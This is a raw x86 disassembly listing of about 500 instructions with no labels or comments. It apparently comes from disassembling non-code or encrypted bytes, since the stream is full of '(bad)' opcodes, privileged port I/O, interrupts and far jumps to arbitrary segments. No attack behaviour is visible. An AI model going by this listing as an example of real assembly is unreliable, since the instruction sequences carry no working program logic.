  41fbae:	push   0xfed4e15e
  41fbb3:	repnz or dl,BYTE PTR [eax-0xcc53b18]
  41fbba:	sti    
  41fbbb:	adc    BYTE PTR [edx-0x61597ad4],dl
  41fbc1:	add    ebx,DWORD PTR [edi]
  41fbc3:	inc    edx
  41fbc4:	sbb    BYTE PTR [ebx],bl
  41fbc6:	mov    edi,0xba35f538
  41fbcb:	sahf   
  41fbcc:	in     al,dx
  41fbcd:	push   edx
  41fbce:	neg    DWORD PTR [ebx-0x3c]
  41fbd1:	adc    DWORD PTR [edi+0x1e53bc96],edx
  41fbd7:	sub    BYTE PTR [edx],cl
  41fbd9:	adc    al,BYTE PTR [edx+0x6]
  41fbdc:	mov    al,0x3b
  41fbde:	les    edx,FWORD PTR [edi+0x64]
  41fbe1:	cs out 0x67,eax
  41fbe4:	jo     0x41fbf1
  41fbe6:	cmp    eax,DWORD PTR [ebp+0x4d]
  41fbe9:	aam    0x0
	...
  41fbf7:	xchg   ebp,eax
  41fbf8:	jmp    0xfbbf:0xd77fc67d
  41fbff:	cmp    eax,0x6d388aa8
  41fc04:	icebp  
  41fc05:	mov    ebp,0x17986ee
  41fc0a:	add    BYTE PTR [ebx],ch
  41fc0c:	add    al,BYTE PTR [eax]
  41fc0e:	add    BYTE PTR [ebx-0x61020281],dh
  41fc14:	sub    al,0x24
  41fc16:	xor    DWORD PTR [ebx],ebx
  41fc18:	pusha  
  41fc19:	mov    edi,ebp
  41fc1b:	and    BYTE PTR [eax+0x3ecae204],0xdc
  41fc22:	ins    DWORD PTR es:[edi],dx
  41fc23:	stos   DWORD PTR es:[edi],eax
  41fc24:	mov    cl,0xe
  41fc26:	jne    0x41fbb4
  41fc28:	mov    ebp,DWORD PTR [eax-0x31]
  41fc2b:	sbb    al,0x9a
  41fc2d:	sub    bh,al
  41fc2f:	jecxz  0x41fc14
  41fc31:	xchg   ecx,esp
  41fc33:	stc    
  41fc34:	shl    DWORD PTR [ecx],0xe4
  41fc37:	in     al,0x3f
  41fc39:	inc    ebp
  41fc3a:	cs std 
  41fc3c:	mov    edi,0xf08a14f1
  41fc41:	pushf  
  41fc42:	add    eax,DWORD PTR [esi]
  41fc44:	dec    eax
  41fc45:	call   0xfedd:0xae52bef8
  41fc4c:	jno    0x41fc0b
  41fc4e:	push   eax
  41fc4f:	test   dh,ch
  41fc51:	xor    DWORD PTR [eax],edi
  41fc53:	dec    ebp
  41fc54:	add    eax,0x62f0cd11
  41fc59:	adc    al,0x53
  41fc5b:	or     edx,DWORD PTR [edx-0x50]
  41fc5e:	xchg   edx,eax
  41fc5f:	mov    ds:0xdf095110,eax
  41fc64:	sub    eax,0x1f869e39
  41fc69:	sbb    edi,ecx
  41fc6b:	test   al,0xe1
  41fc6d:	xor    eax,0x7713f974
  41fc72:	xchg   edx,eax
  41fc73:	imul   esi,ebx,0xffffff9d
  41fc76:	shr    ebx,0x2f
  41fc79:	sbb    BYTE PTR [edi],ah
  41fc7b:	in     eax,dx
  41fc7c:	call   0xa021:0x18a0dd5c
  41fc83:	jae    0x41fc26
  41fc85:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fc86:	rep outs dx,BYTE PTR ds:[esi]
  41fc88:	nop
  41fc89:	pop    ss
  41fc8a:	pop    ebx
  41fc8b:	(bad)  
  41fc8c:	add    BYTE PTR [ebx-0x6c],dh
  41fc8f:	mov    ebx,0x245a8134
  41fc94:	push   cs
  41fc95:	neg    BYTE PTR [edi+0x177a5831]
  41fc9b:	stos   BYTE PTR es:[edi],al
  41fc9c:	popa   
  41fc9d:	xchg   ebx,eax
  41fc9e:	adc    DWORD PTR [eax+edi*1-0x4b169509],eax
  41fca5:	scas   al,BYTE PTR es:[edi]
  41fca6:	call   0xbac75f69
  41fcab:	cs mov al,0xd9
  41fcae:	mov    cl,BYTE PTR [edi+0x3093c462]
  41fcb4:	mov    ebp,?
  41fcb6:	mov    eax,ds:0x55cd15be
  41fcbb:	inc    ecx
  41fcbc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fcbd:	cs cdq 
  41fcbf:	idiv   dh
  41fcc1:	sub    BYTE PTR [ebp+0xa40ea67],bh
  41fcc7:	pop    ecx
  41fcc8:	(bad)  
  41fcc9:	or     esp,ebx
  41fccb:	push   esi
  41fccc:	xchg   esi,eax
  41fccd:	aaa    
  41fcce:	stos   DWORD PTR es:[edi],eax
  41fccf:	imul   esp,DWORD PTR [esi+0xd],0xe94fbc0c
  41fcd6:	(bad)  
  41fcd7:	xchg   ecx,eax
  41fcd8:	pop    esp
  41fcd9:	jb     0x41fc73
  41fcdb:	xchg   edx,eax
  41fcdc:	lods   eax,DWORD PTR ds:[esi]
  41fcdd:	mov    esp,es
  41fcdf:	sar    dl,cl
  41fce1:	and    ah,BYTE PTR [eax]
  41fce3:	sbb    DWORD PTR [ecx+0x5317a30d],edi
  41fce9:	lods   al,BYTE PTR ds:[esi]
  41fcea:	mov    ds:0x7264060e,al
  41fcef:	not    BYTE PTR [ecx+0xdbc49af]
  41fcf5:	or     eax,0x743bd23b
  41fcfa:	arpl   bx,cx
  41fcfc:	dec    esp
  41fcfd:	repz mov ch,BYTE PTR [ebp-0x51]
  41fd01:	jl     0x41fd40
  41fd03:	adc    ecx,DWORD PTR [edx+ebx*2-0x17]
  41fd07:	pop    edi
  41fd08:	retf   0x7240
  41fd0b:	sti    
  41fd0c:	lods   eax,DWORD PTR ds:[esi]
  41fd0d:	jno    0x41fd17
  41fd0f:	xchg   esp,eax
  41fd10:	add    dh,bh
  41fd12:	inc    esp
  41fd13:	inc    ecx
  41fd14:	push   edi
  41fd15:	dec    esp
  41fd16:	jg     0x41fd57
  41fd18:	lods   al,BYTE PTR ds:[esi]
  41fd19:	fdivrp st(4),st
  41fd1b:	dec    esp
  41fd1c:	add    BYTE PTR [ecx+ebx*4],0x1c
  41fd20:	push   ds
  41fd21:	cmp    al,0x42
  41fd23:	fstp   DWORD PTR [ecx]
  41fd25:	add    al,0xcd
  41fd27:	cli    
  41fd28:	mov    BYTE PTR ds:0x80003c48,0xe7
  41fd2f:	mov    ecx,0xdc5a8615
  41fd34:	mov    ah,0xba
  41fd36:	adc    DWORD PTR [ebx+0x468f3f05],edi
  41fd3c:	lock mov ds:0x9668f60c,al
  41fd42:	rol    BYTE PTR [eax+0xf98841e],1
  41fd48:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fd49:	ret    0xd138
  41fd4c:	je     0x41fdc9
  41fd4e:	and    eax,0x57394107
  41fd53:	or     BYTE PTR ds:0xaa9339e,dl
  41fd59:	and    DWORD PTR [ecx+0x46],0x55
  41fd5d:	dec    ebp
  41fd5e:	pop    es
  41fd5f:	xchg   BYTE PTR [edx],dl
  41fd61:	xor    eax,0x803a189
  41fd66:	jbe    0x41fd5b
  41fd68:	dec    eax
  41fd69:	cmc    
  41fd6a:	enter  0x3a0b,0x64
  41fd6e:	sti    
  41fd6f:	ror    BYTE PTR [esi+0x7a],cl
  41fd72:	retf   0xdc44
  41fd75:	(bad)  
  41fd76:	aad    0x8f
  41fd78:	daa    
  41fd79:	push   ecx
  41fd7a:	sub    edi,edi
  41fd7c:	xchg   ebx,eax
  41fd7d:	rcl    BYTE PTR [esi+0x51],cl
  41fd80:	adc    cl,al
  41fd82:	fistp  WORD PTR [ebp-0x6a]
  41fd85:	cmc    
  41fd86:	loopne 0x41fdbf
  41fd88:	adc    eax,0xf6432d3b
  41fd8d:	sbb    ch,dl
  41fd8f:	add    DWORD PTR [ebp+0x387d1db8],esi
  41fd95:	cwde   
  41fd96:	and    edi,DWORD PTR [eax]
  41fd98:	adc    al,0xc7
  41fd9a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fd9b:	push   ecx
  41fd9c:	mov    cs,WORD PTR [ebp+0x339c41b2]
  41fda2:	mov    eax,0xe2313ce7
  41fda7:	nop
  41fda8:	mov    bl,0xd7
  41fdaa:	retf   
  41fdab:	lods   al,BYTE PTR ds:[esi]
  41fdac:	pushf  
  41fdad:	call   0xfefd6422
  41fdb2:	ins    BYTE PTR es:[edi],dx
  41fdb3:	mov    dh,0x9a
  41fdb5:	stc    
  41fdb6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fdb7:	mov    al,0x33
  41fdb9:	sub    DWORD PTR [bx+di+0x7e77],ebp
  41fdbe:	push   es
  41fdbf:	retf   0x2e55
  41fdc2:	cmp    al,0xfc
  41fdc4:	lods   al,BYTE PTR ds:[esi]
  41fdc5:	loope  0x41fe04
  41fdc7:	push   ds
  41fdc8:	fst    DWORD PTR [ecx+0x23abb0d8]
  41fdce:	pop    esp
  41fdcf:	push   0xbffae49f
  41fdd4:	rcr    BYTE PTR [edx-0x5172156c],1
  41fdda:	rdtsc  
  41fddc:	outs   dx,DWORD PTR ds:[esi]
  41fddd:	addr16 call 0x1207:0x766df652
  41fde5:	sub    ebx,esi
  41fde7:	pusha  
  41fde8:	js     0x41fe03
  41fdea:	mov    BYTE PTR [edx-0x5f],bl
  41fded:	outs   dx,DWORD PTR ds:[esi]
  41fdee:	daa    
  41fdef:	dec    ebx
  41fdf0:	(bad)  
  41fdf1:	jb     0x41fd7b
  41fdf3:	(bad)  
  41fdf4:	jb     0x41fe15
  41fdf6:	and    al,0x96
  41fdf8:	cmp    dl,BYTE PTR [eax-0x79]
  41fdfb:	retf   
  41fdfc:	je     0x41fde0
  41fdfe:	jno    0x41fe6d
  41fe00:	stos   BYTE PTR es:[edi],al
  41fe01:	int    0xfb
  41fe03:	out    dx,eax
  41fe04:	rol    BYTE PTR [eax],1
  41fe06:	mov    ss,ebx
  41fe08:	push   esi
  41fe09:	js     0x41fde6
  41fe0b:	jmp    0x3358:0x86ba21b2
  41fe12:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fe13:	xchg   ecx,eax
  41fe14:	nop
  41fe15:	inc    eax
  41fe16:	push   cs
  41fe17:	sti    
  41fe18:	jge    0x41fde6
  41fe1a:	or     BYTE PTR [ecx+0x23],bh
  41fe1d:	rep lods al,BYTE PTR ds:[esi]
  41fe1f:	ficomp WORD PTR [eax-0x36846769]
  41fe25:	or     cl,BYTE PTR [ebx+0x6d]
  41fe28:	xchg   DWORD PTR [edi],ebx
  41fe2a:	pop    ecx
  41fe2b:	xchg   edi,eax
  41fe2c:	sub    esp,DWORD PTR ds:0xf5b9c5dc
  41fe32:	jle    0x41fe4e
  41fe34:	test   eax,0x75a295d3
  41fe39:	mov    ds:0x0,eax
	...
  41fe46:	add    ch,al
  41fe48:	outs   dx,BYTE PTR ds:[esi]
  41fe49:	push   edx
  41fe4a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fe4b:	sti    
  41fe4c:	mov    edi,0x23b06ef5
  41fe51:	loopne 0x41fe53
  41fe53:	outs   dx,DWORD PTR ds:[esi]
  41fe54:	add    eax,0x7bb16824
  41fe59:	add    DWORD PTR [eax],eax
  41fe5b:	sub    eax,DWORD PTR [edx]
  41fe5d:	add    BYTE PTR [eax],al
  41fe5f:	imul   ebx,DWORD PTR [ebx-0x41],0xffffffa3
  41fe63:	jb     0x41fe6e
  41fe65:	inc    ecx
  41fe66:	aaa    
  41fe67:	pop    ebp
  41fe68:	cmp    al,0xf7
  41fe6a:	cmp    bh,cl
  41fe6c:	dec    ebp
  41fe6d:	ficomp WORD PTR [edi]
  41fe6f:	sub    BYTE PTR [esi-0x39],0x55
  41fe73:	xor    ch,BYTE PTR [edx+0x175d332a]
  41fe79:	rcr    BYTE PTR [eax+0x18],0xfc
  41fe7d:	rcr    dl,cl
  41fe7f:	mov    cl,0x71
  41fe81:	gs sub al,0xf4
  41fe84:	cwde   
  41fe85:	stos   BYTE PTR es:[edi],al
  41fe86:	mov    cl,0x94
  41fe88:	call   0xe620:0x1ba1a37a
  41fe8f:	add    eax,0x9bfb4bb5
  41fe94:	xchg   edx,eax
  41fe95:	sbb    cl,ch
  41fe97:	sar    edi,1
  41fe99:	jns    0x41fe29
  41fe9b:	mov    gs,WORD PTR [ebx]
  41fe9d:	jmp    FWORD PTR [ecx-0x5e]
  41fea0:	bound  esp,QWORD PTR [eax+0x1b805b64]
  41fea6:	jns    0x41fefb
  41fea8:	rcr    DWORD PTR [edi],cl
  41feaa:	out    0xf1,eax
  41feac:	or     BYTE PTR [ebx+0x68],dl
  41feaf:	push   ebp
  41feb0:	in     al,dx
  41feb1:	push   ecx
  41feb2:	aaa    
  41feb3:	sbb    ebp,DWORD PTR [ebx+esi*2+0x4a]
  41feb7:	repz adc DWORD PTR [ebx+0x1b],esi
  41febb:	sar    BYTE PTR [eax],cl
  41febd:	push   ecx
  41febe:	or     al,0xbd
  41fec0:	ja     0x41fea0
  41fec2:	mov    BYTE PTR [edx-0x32],al
  41fec5:	mov    edi,0xabcd95fc
  41feca:	in     eax,dx
  41fecb:	inc    ebp
  41fecc:	push   0xfffffff4
  41fece:	and    eax,0x4d2fde64
  41fed3:	fsub   DWORD PTR [esi]
  41fed5:	add    BYTE PTR [ebx],al
  41fed7:	sub    edi,eax
  41fed9:	adc    ebx,DWORD PTR [esi-0xd3fde0f]
  41fedf:	xchg   DWORD PTR [ebx],eax
  41fee1:	jmp    0x1d4c4014
  41fee6:	addr16 mov eax,0xf2e93a13
  41feec:	mov    dh,0x3c
  41feee:	xchg   edi,eax
  41feef:	gs sbb al,0x2c
  41fef2:	add    al,0x13
  41fef4:	lods   al,BYTE PTR ds:[esi]
  41fef5:	retf   0x6bc4
  41fef8:	shl    DWORD PTR [ecx+0x51],0x82
  41fefc:	or     ah,ah
  41fefe:	retf   
  41feff:	pop    esp
  41ff00:	(bad)  
  41ff01:	(bad)  
  41ff02:	push   0xf0c50f2e
  41ff07:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ff08:	mov    edx,0xa0cfc653
  41ff0d:	mov    bl,BYTE PTR [ecx]
  41ff0f:	pushf  
  41ff10:	inc    edi
  41ff11:	retf   0xe4f5
  41ff14:	loopne 0x41ff3c
  41ff16:	pop    ebp
  41ff17:	adc    DWORD PTR [edx],0xf
  41ff1a:	into   
  41ff1b:	pop    esp
  41ff1c:	adc    BYTE PTR [ebp-0x635be7e3],bh
  41ff22:	in     al,dx
  41ff23:	daa    
  41ff24:	scas   eax,DWORD PTR es:[edi]
  41ff25:	call   0x19f4638b
  41ff2a:	adc    bh,BYTE PTR [esi]
  41ff2c:	jmp    0x8c3ebc91
  41ff31:	xor    DWORD PTR [esi-0x688544ef],esp
  41ff37:	and    BYTE PTR [esi-0x2a95e9c5],al
  41ff3d:	jp     0x41ff44
  41ff3f:	lds    ecx,FWORD PTR [ebx+0x73a84df9]
  41ff45:	(bad)  
  41ff46:	xor    ebx,ecx
  41ff48:	push   es
  41ff49:	lods   al,BYTE PTR ds:[esi]
  41ff4a:	mov    ebp,0x846a8788
  41ff4f:	sbb    DWORD PTR [ebp+esi*4-0xc],esp
  41ff53:	mov    al,ds:0x3abcb249
  41ff58:	push   ss
  41ff59:	fmul   DWORD PTR [ebx+0x43]
  41ff5c:	add    ecx,esi
  41ff5e:	push   cs
  41ff5f:	jbe    0x41ff1b
  41ff61:	aaa    
  41ff62:	mov    ds:0x2a3f307f,al
  41ff67:	retf   0xbe1d
  41ff6a:	mov    BYTE PTR [ebx-0x69c63372],bh
  41ff70:	mov    al,ds:0x44fa58c1
  41ff75:	xchg   esp,eax
  41ff76:	xchg   esp,eax
  41ff77:	mov    bh,0x19
  41ff79:	push   ecx
  41ff7a:	retf   0xe042
  41ff7d:	add    BYTE PTR [ebx],dh
  41ff7f:	test   DWORD PTR [ebx-0x50],edx
  41ff82:	jb     0x41ff3b
  41ff84:	out    0xbd,eax
  41ff86:	and    ecx,esi
  41ff88:	mov    eax,0xa64798ff
  41ff8d:	push   ebx
  41ff8e:	jle    0x41ff22
  41ff90:	repz mov edx,0xbda9a002
  41ff96:	inc    esi
  41ff97:	in     eax,0x63
  41ff99:	ja     0x41ff8f
  41ff9b:	lock adc ebp,DWORD PTR [eax]
  41ff9e:	cdq    
  41ff9f:	xchg   esi,eax
  41ffa0:	jmp    0x41ff53
  41ffa2:	aaa    
  41ffa3:	mov    al,0xf2
  41ffa5:	sub    eax,0xf7d1c623
  41ffaa:	ja     0x41ff53
  41ffac:	scas   eax,DWORD PTR es:[edi]
  41ffad:	xchg   edi,edi
  41ffaf:	sub    al,0x8
  41ffb1:	or     esi,edi
  41ffb3:	fs dec ecx
  41ffb5:	das    
  41ffb6:	popf   
  41ffb7:	and    bl,BYTE PTR [edi]
  41ffb9:	mov    ds:0xef15414e,eax
  41ffbe:	enter  0xcc33,0x6c
  41ffc2:	sub    eax,0xff1ea536
  41ffc7:	push   es
  41ffc8:	cmp    DWORD PTR [edi+0x15],esi
  41ffcb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ffcc:	xchg   ebp,eax
  41ffcd:	bound  edx,QWORD PTR [edx-0x63]
  41ffd0:	loopne 0x420024
  41ffd2:	and    DWORD PTR [ecx],edi
  41ffd4:	in     al,0xfb
  41ffd6:	adc    DWORD PTR [eax],edx
  41ffd8:	push   cx
  41ffda:	fist   DWORD PTR [ebp-0x51936062]
  41ffe0:	pushf  
  41ffe1:	das    
  41ffe2:	out    0x5f,eax
  41ffe4:	inc    esi
  41ffe5:	mov    ds:0x18fe2aee,al
  41ffea:	repnz push esi
  41ffec:	cmp    eax,0x8cc500f6
  41fff1:	pop    edi
  41fff2:	push   ebx
  41fff3:	pop    ds
  41fff4:	test   esi,0x11dfbf09
  41fffa:	nop
  41fffb:	aas    
  41fffc:	dec    ebp
  41fffd:	adc    al,0xc
  41ffff:	jg     0x41ffed
  420001:	inc    ecx
  420002:	int    0x93
  420004:	jnp    0x41ffec
  420006:	jecxz  0x42002b
  420008:	sub    eax,0xeadd671b
  42000d:	dec    ebx
  42000e:	dec    eax
  42000f:	bound  ecx,QWORD PTR [eax]
  420011:	cmc    
  420012:	sti    
  420013:	test   al,0x86
  420015:	sub    al,BYTE PTR [ebx+0x2a85c6a4]
  42001b:	arpl   si,dx
  42001d:	cmp    eax,0xb2355db5
  420022:	mov    eax,ds:0x93c8620d
  420027:	lds    ebx,FWORD PTR [esi]
  420029:	pcmpgtb mm5,QWORD PTR [esi+0x6b]
  42002d:	jg     0x41ffdc
  42002f:	in     eax,0x67
  420031:	pop    esp
  420032:	sub    eax,0x148bd4f9
  420037:	imul   edx,DWORD PTR [ebp-0x21],0xe0d6e458
  42003e:	popaw  
  420040:	mov    ah,0xb8
  420042:	(bad)  
  420043:	ja     0x420048
  420045:	cdq    
  420046:	adc    BYTE PTR ds:0x4be9b742,0xb
  42004d:	lds    esi,FWORD PTR [ebx+0x33]
  420050:	dec    ebx
  420051:	scas   eax,DWORD PTR es:[edi]
  420052:	les    eax,FWORD PTR [edi-0x51]
  420055:	ret    0x3378
  420058:	pop    ebp
  420059:	and    dl,BYTE PTR [edi+eiz*4+0x577ef76b]
  420060:	rol    DWORD PTR [ebp+0xdedc343],cl
  420066:	stos   DWORD PTR es:[edi],eax
  420067:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420068:	cld    
  420069:	retf   0xf6bf
  42006c:	dec    ecx
  42006d:	(bad)  
  42006e:	xchg   esi,eax
  42006f:	stc    
  420070:	pop    es
  420071:	cli    
  420072:	dec    esi
  420073:	mov    al,ds:0x655d85a4
  420078:	(bad)  
  420079:	lods   al,BYTE PTR ds:[esi]
  42007a:	lods   eax,DWORD PTR ds:[esi]
  42007b:	in     eax,dx
  42007c:	xchg   edx,eax
  42007d:	stos   DWORD PTR es:[edi],eax
  42007e:	push   es
  42007f:	sbb    ebx,0x3c
  420082:	pusha  
  420083:	lea    eax,[esi+0x62]
  420086:	pop    esi
  420087:	push   esp
  420088:	adc    ch,al
	...
  420096:	add    BYTE PTR [ebp-0x5d],dl
  420099:	push   ebx
  42009a:	(bad)  
  42009b:	idiv   edi
  42009d:	(bad)  
  42009f:	or     ebp,DWORD PTR [ebx+ebp*8+0x0]
  4200a3:	xor    bl,BYTE PTR [esi]
  4200a5:	sbb    BYTE PTR [ebx-0x24],dh
  4200a8:	jge    0x4200ab
  4200aa:	add    BYTE PTR [ebx],ch
  4200ac:	add    al,BYTE PTR [eax]
  4200ae:	add    BYTE PTR [edx-0x13],ch
  4200b1:	mov    cl,dh
  4200b3:	(bad)  
  4200b4:	cmp    eax,0x1ed83872
  4200b9:	call   0xc2c4:0x8605923f
  4200c0:	fwait
  4200c1:	dec    esp
  4200c2:	jge    0x42008b
  4200c4:	lods   al,BYTE PTR ds:[esi]
  4200c5:	ss ins DWORD PTR es:[edi],dx
  4200c7:	cli    
  4200c8:	addr16 inc bh
  4200cb:	je     0x420145
  4200cd:	jp     0x4200cc
  4200cf:	xlat   BYTE PTR ds:[ebx]
  4200d0:	mov    ah,0xf
  4200d2:	xor    eax,0x23a8e742
  4200d7:	mov    ecx,0xe94b8fdd
  4200dc:	sbb    eax,0x3a6cb81f
  4200e1:	mov    al,0xa
  4200e3:	loope  0x4200dc
  4200e5:	call   0xd5a13ac6
  4200ea:	cmp    esi,DWORD PTR [ebx-0x4d]
  4200ed:	sbb    eax,0x68951a44
  4200f2:	dec    edx
  4200f3:	cli    
  4200f4:	cmp    al,0xdc
  4200f6:	dec    ebp
  4200f7:	(bad)  
  4200f8:	fs loope 0x4200fa
  4200fb:	mov    edi,0x19253994
  420100:	inc    ebp
  420101:	cmp    cl,dl
  420103:	jbe    0x420179
  420105:	int3   
  420106:	bound  edx,QWORD PTR [eax+0x6a]
  420109:	and    esi,DWORD PTR [edi-0x5c]
  42010c:	jne    0x42018c
  42010e:	cld    
  42010f:	call   0xcfbc9b6d
  420114:	ja     0x420100
  420116:	xor    eax,0x62cfec6c
  42011b:	int    0x82
  42011d:	mov    edi,0xadd5bc94
  420122:	pop    edx
  420123:	shl    bl,1
  420125:	popa   
  420126:	call   0xa39a4015
  42012b:	fstp   DWORD PTR [edx+0x7febd8bb]
  420131:	pop    edx
  420132:	xor    al,0x7e
  420134:	add    ch,BYTE PTR [esp+edx*4+0x7e6efd97]
  42013b:	xchg   esi,eax
  42013c:	jge    0x42012f
  42013e:	cwde   
  42013f:	fadd   st,st(4)
  420141:	shl    DWORD PTR [ebx-0x1f],1
  420144:	jp     0x420108
  420146:	test   DWORD PTR [ecx-0x250b22fb],esp
  42014c:	inc    ebx
  42014d:	jb     0x420177
  42014f:	bound  ebp,QWORD PTR [ebx]
  420151:	sub    esi,ebp
  420153:	ffree  st(0)
  420155:	loope  0x4200e4
  420157:	nop
  420158:	xor    cl,BYTE PTR [ecx]
  42015a:	inc    eax
  42015b:	mov    eax,0xf19753f9
  420160:	loop   0x4200ff
  420162:	ds push eax
  420164:	ror    ecx,0x54
  420167:	sbb    BYTE PTR [ebp+0xceb708],0x5e
  42016e:	stos   BYTE PTR es:[edi],al
  42016f:	call   0xb96687ac
  420174:	stc    
  420175:	push   edx
  420176:	rol    BYTE PTR [ebp+0x38],cl
  420179:	or     ebp,DWORD PTR [ecx-0x69a111fd]
  42017f:	(bad)  
  420180:	jne    0x10795026
  420186:	push   0x79
  420188:	or     esi,DWORD PTR [edi-0x29]
  42018b:	pop    ss
  42018c:	test   DWORD PTR [ebx+0x2a4dfe9b],ebx
  420192:	(bad)  
  420193:	push   ebx
  420194:	xor    eax,0x357158a8
  420199:	(bad)  
  42019a:	out    dx,al
  42019b:	daa    
  42019c:	hlt    
  42019d:	sahf   
  42019e:	pop    ecx
  42019f:	popf   
  4201a0:	nop
  4201a1:	add    bl,bh
  4201a3:	adc    eax,0x32bc418e
  4201a8:	stc    
  4201a9:	push   es
  4201aa:	(bad)  
  4201ac:	or     cl,BYTE PTR [edi+0x10]
  4201af:	pop    es
  4201b0:	loop   0x42019c
  4201b2:	dec    ecx
  4201b3:	dec    esi
  4201b4:	dec    esp
  4201b5:	add    eax,DWORD PTR [eax+0x5ebb75d3]
  4201bb:	or     esp,DWORD PTR [ecx]
  4201bd:	stos   DWORD PTR es:[edi],eax
  4201be:	mov    cl,0xd
  4201c0:	cmp    BYTE PTR [ecx],cl
  4201c2:	jno    0x42018e
  4201c4:	xchg   edx,eax
  4201c5:	jmp    0x42018c
  4201c7:	cld    
  4201c8:	sbb    esp,ebp
  4201ca:	pop    eax
  4201cb:	or     DWORD PTR [ecx],ecx
  4201cd:	mov    ebp,0xad0a1cb3
  4201d2:	push   cs
  4201d3:	sub    eax,0xbfd683c
  4201d8:	add    ebp,edx
  4201da:	das    
  4201db:	xchg   ebx,eax
  4201dc:	daa    
  4201dd:	sub    DWORD PTR [ecx-0x70],ebx
  4201e0:	cmp    DWORD PTR fs:[esi-0x70],0x9a6bdddc
  4201e8:	and    DWORD PTR [ecx+0x6c],ecx
  4201eb:	fidiv  DWORD PTR [edi+esi*1+0x1dd342b5]
  4201f2:	out    dx,eax
  4201f3:	xchg   cl,bl
  4201f5:	rcr    ecx,cl
  4201f7:	add    al,0x9e
  4201f9:	sbb    al,0x22
  4201fb:	sbb    ah,BYTE PTR ds:0x5d92741f
  420201:	loope  0x4201d6
  420203:	xor    al,0xf6
  420205:	add    al,0xf9
  420207:	lea    ebx,[edx]
  420209:	pop    ds
  42020a:	(bad)  
  42020b:	ss xchg edx,eax
  42020d:	aaa    
  42020e:	jnp    0x42027d
  420210:	sbb    ah,BYTE PTR [ecx+0x2e9b492f]
  420216:	push   ds
  420217:	js     0x4201f0
  420219:	jbe    0x420249
  42021b:	adc    eax,0xd4aa1377
  420220:	mov    ah,0xb2
  420222:	ret    
  420223:	and    esp,0xd35b91f1
  420229:	ja     0x420261
  42022b:	xchg   edi,eax
  42022c:	or     bl,BYTE PTR [edi+0x59]
  42022f:	sub    DWORD PTR [ebx],edx
  420231:	xor    BYTE PTR [ebx+0x613369a6],0xc3
  420238:	(bad)  
  420239:	mov    ds:0x7afb7041,eax
  42023e:	adc    al,0xf2
  420240:	nop
  420241:	sbb    al,0xf6
  420243:	jbe    0x4202af
  420245:	pushf  
  420246:	sub    al,0x3d
  420248:	dec    eax
  420249:	xor    al,ah
  42024b:	mov    bh,0xcf
  42024d:	mov    esi,0xee99de7e
  420252:	cmp    cl,ch
  420254:	test   BYTE PTR [ecx+ebx*4-0x2c80eaf0],ah
  42025b:	mov    ebx,0xaf6215ee
  420260:	test   BYTE PTR es:0x2ee51fef,cl
  420267:	inc    esp
  420268:	sub    ebx,esi
  42026a:	rol    ah,1
  42026c:	in     eax,0x47
  42026e:	scas   al,BYTE PTR es:[edi]
  42026f:	sub    DWORD PTR [edi],ebx
  420271:	pop    es
  420272:	call   0x74d8:0xd13af8e9
  420279:	icebp  
  42027a:	sub    esi,DWORD PTR [ecx+0x62187c59]
  420280:	fs xor ah,cl
  420283:	dec    edi
  420284:	cmp    DWORD PTR cs:[ebp-0x34],0x18
  420289:	and    BYTE PTR [edi+0x44f84336],ch
  42028f:	fsubr  QWORD PTR [esi+0x26cd3295]
  420295:	sub    esp,edi
  420297:	mov    al,ds:0xdaed33
  42029c:	cwde   
  42029d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42029e:	inc    esp
  42029f:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4202a1:	les    ecx,FWORD PTR [ebp+esi*8+0x24]
  4202a5:	adc    bx,di
  4202a8:	loop   0x4202d5
  4202aa:	xchg   esi,eax
  4202ab:	push   edi
  4202ac:	in     eax,dx
  4202ad:	lea    ebx,[esi-0x37]
  4202b0:	imul   ebx,edi,0xfffffffd
  4202b3:	mov    bl,0x22
  4202b5:	dec    ebx
  4202b6:	xchg   ebx,eax
  4202b7:	jo     0x420293
  4202b9:	pop    ds
  4202ba:	(bad)  
  4202bb:	ds jo  0x42027f
  4202be:	fdivr  DWORD PTR [ebx]
  4202c0:	mov    ecx,0x321f29aa
  4202c5:	call   0x92123569
  4202ca:	jg     0x420252
  4202cc:	daa    
  4202cd:	xchg   esp,eax
  4202ce:	pop    esi
  4202cf:	push   edi
  4202d0:	and    eax,DWORD PTR [ecx+esi*8-0xb]
  4202d4:	cmp    cl,bl
  4202d6:	jbe    0x420342
  4202d8:	jl     0x420327
	...
  4202e6:	add    BYTE PTR [ebx-0x17],ch
  4202e9:	jmp    0x98ed:0x6fcfeace
  4202f0:	mov    edi,0x61f57903
  4202f5:	jnp    0x4202b0
  4202f7:	pop    es
  4202f8:	add    BYTE PTR [ecx],0x0
  4202fb:	sub    eax,DWORD PTR [edx]
  4202fd:	add    BYTE PTR [eax],al
  4202ff:	imul   eax,DWORD PTR [esp+eiz*2],0x5db8826
  420306:	push   ss
  420307:	retf   
  420308:	sbb    BYTE PTR [ebx-0x80],bl
  42030b:	ror    DWORD PTR [edi-0x6e],cl
  42030e:	push   es
  42030f:	xor    BYTE PTR [ebx+eax*8-0x6f],0x52
  420314:	scas   eax,DWORD PTR es:[edi]
  420315:	out    dx,al
  420316:	ror    edx,1
  420318:	inc    esp
  420319:	jmp    DWORD PTR [edi]
  42031b:	mov    ah,bl
  42031d:	out    0x77,al
  42031f:	add    eax,DWORD PTR [eax+eiz*4-0x513281e7]
  420326:	cmp    eax,0x5a095236
  42032b:	jecxz  0x4202de
  42032d:	sbb    ch,BYTE PTR [ecx+0x466718d1]
  420333:	clc    
  420334:	and    DWORD PTR [eax+ebx*1+0x6b],edi
  420338:	in     eax,0x21
  42033a:	jae    0x4202f0
  42033c:	xor    al,0x2
  42033e:	ret    
  42033f:	dec    edi
  420340:	and    DWORD PTR [esp+ebx*8-0x2c],edi
  420344:	lods   eax,DWORD PTR es:[esi]
  420346:	jmp    0x6de8:0x42900b19
  42034d:	(bad)  [ecx+ebx*2]
